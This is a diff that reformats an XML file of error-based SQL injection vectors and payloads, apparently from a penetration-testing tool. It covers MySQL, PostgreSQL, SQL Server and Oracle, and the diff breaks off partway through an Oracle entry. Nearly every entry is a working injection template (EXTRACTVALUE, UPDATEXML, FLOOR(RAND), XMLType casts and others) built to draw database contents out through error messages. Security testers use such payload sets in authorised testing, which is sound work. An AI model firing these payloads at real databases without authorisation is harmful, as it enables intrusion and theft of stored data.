@@ -9,13 +9,17 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT
+            CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             -->
-            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -34,13 +38,17 @@
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>1</where>
-        <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s),
+            8446744073709551610, 8446744073709551610)))
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
             -->
-            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -58,9 +66,12 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
+        <vector>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))
+        </vector>
         <request>
-            <payload>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+            <payload>AND EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -80,7 +91,9 @@
         <where>1</where>
         <vector>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))x))</vector>
         <request>
-            <payload>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))</payload>
+            <payload>OR EXP(~(SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]','x'))x))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -98,9 +111,13 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <vector>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING
+            utf8)))
+        </vector>
         <request>
-            <payload>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+            <payload>AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -119,9 +136,13 @@
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>1</where>
-        <vector>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING utf8)))</vector>
+        <vector>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')) USING
+            utf8)))
+        </vector>
         <request>
-            <payload>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))</payload>
+            <payload>OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]')) USING utf8)))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -139,13 +160,19 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <vector>AND (SELECT [RANDNUM] FROM(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM
+            INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             -->
-            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS
+                GROUP BY x)a)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -164,13 +191,19 @@
         <clause>1,2,3,8,9</clause>
         <!-- Despite this is an OR payload, keep where to 1 because otherwise it will not work when injecting in ORDER BY or GROUP BY -->
         <where>1</where>
-        <vector>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</vector>
+        <vector>OR (SELECT [RANDNUM] FROM(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM
+            INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
             -->
-            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</payload>
+            <payload>OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS
+                GROUP BY x)a)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -194,7 +227,9 @@
             <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
             <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
             -->
-            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            <payload>AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -219,7 +254,9 @@
             <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'))</payload>
             <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
             -->
-            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))</payload>
+            <payload>OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -237,13 +274,16 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])</vector>
+        <vector>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1])
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
             <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
             -->
-            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            <payload>AND UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -268,7 +308,9 @@
             <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
             <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
             -->
-            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])</payload>
+            <payload>OR UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]'),[RANDNUM1])
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -286,13 +328,19 @@
         <risk>1</risk>
         <clause>1,2,3,8,9</clause>
         <where>1</where>
-        <vector>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
+        <vector>AND ROW([RANDNUM],[RANDNUM1])>(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2]
+            UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
             <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
             -->
-            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            <payload>AND ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT
+                [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -311,13 +359,19 @@
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>1</where>
-        <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</vector>
+        <vector>OR ROW([RANDNUM],[RANDNUM1])>(SELECT
+            COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2]
+            UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+        </vector>
         <request>
             <!-- These work as good as ELT(), but are longer
             <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
             <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (MAKE_SET([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
             -->
-            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)</payload>
+            <payload>OR ROW([RANDNUM],[RANDNUM1])>(SELECT COUNT(*),CONCAT('[DELIMITER_START]',(SELECT
+                (ELT([RANDNUM]=[RANDNUM],1))),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM (SELECT [RANDNUM2] UNION SELECT
+                [RANDNUM3] UNION SELECT [RANDNUM4] UNION SELECT [RANDNUM5])a GROUP BY x)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -336,9 +390,12 @@
         <risk>3</risk>
         <clause>1,8,9</clause>
         <where>2</where>
-        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
+        <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)
+        </vector>
         <request>
-            <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</payload>
+            <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)
+            </payload>
             <comment>#</comment>
         </request>
         <response>
@@ -358,7 +415,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
-            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+            <payload>AND [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))::text||'[DELIMITER_STOP]' AS NUMERIC)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -377,7 +436,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=CAST('[DELIMITER_START]'||([QUERY])::text||'[DELIMITER_STOP]' AS NUMERIC)</vector>
         <request>
-            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END))::text||'[DELIMITER_STOP]' AS NUMERIC)</payload>
+            <payload>OR [RANDNUM]=CAST('[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0
+                END))::text||'[DELIMITER_STOP]' AS NUMERIC)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -396,7 +457,9 @@
         <where>1</where>
         <vector>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1'
+                ELSE '0' END))+'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -417,7 +480,9 @@
         <where>2</where>
         <vector>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM] IN (SELECT ('[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE
+                '0' END))+'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -438,7 +503,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>AND [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN
+                '1' ELSE '0' END))+'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -459,7 +526,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+([QUERY])+'[DELIMITER_STOP]'))</vector>
         <request>
-            <payload>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END))+'[DELIMITER_STOP]'))</payload>
+            <payload>OR [RANDNUM]=CONVERT(INT,(SELECT '[DELIMITER_START]'+(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN
+                '1' ELSE '0' END))+'[DELIMITER_STOP]'))
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -480,7 +549,9 @@
         <where>1</where>
         <vector>AND [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+            <payload>AND [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0'
+                END)),'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -501,7 +572,9 @@
         <where>2</where>
         <vector>OR [RANDNUM]=CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')</vector>
         <request>
-            <payload>OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)),'[DELIMITER_STOP]')</payload>
+            <payload>OR [RANDNUM]=CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0'
+                END)),'[DELIMITER_STOP]')
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -520,9 +593,15 @@
         <risk>1</risk>
         <clause>1,9</clause>
         <where>1</where>
-        <vector>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),' ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
+        <vector>AND [RANDNUM]=(SELECT
+            UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(REPLACE(REPLACE(REPLACE(REPLACE(([QUERY]),'
+            ','[SPACE_REPLACE]'),'$','[DOLLAR_REPLACE]'),'@','[AT_REPLACE]'),'#','[HASH_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62)))
+            FROM DUAL)
+        </vector>
         <request>
-            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</payload>
+            <payload>AND [RANDNUM]=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'[DELIMITER_START]'||(SELECT (CASE WHEN
+                ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END) FROM DUAL)||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)
+            </payload>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -539,9 +618,14 @@
         <risk>3</risk>
         <clause>1,9</clause>
         <where>2</where>
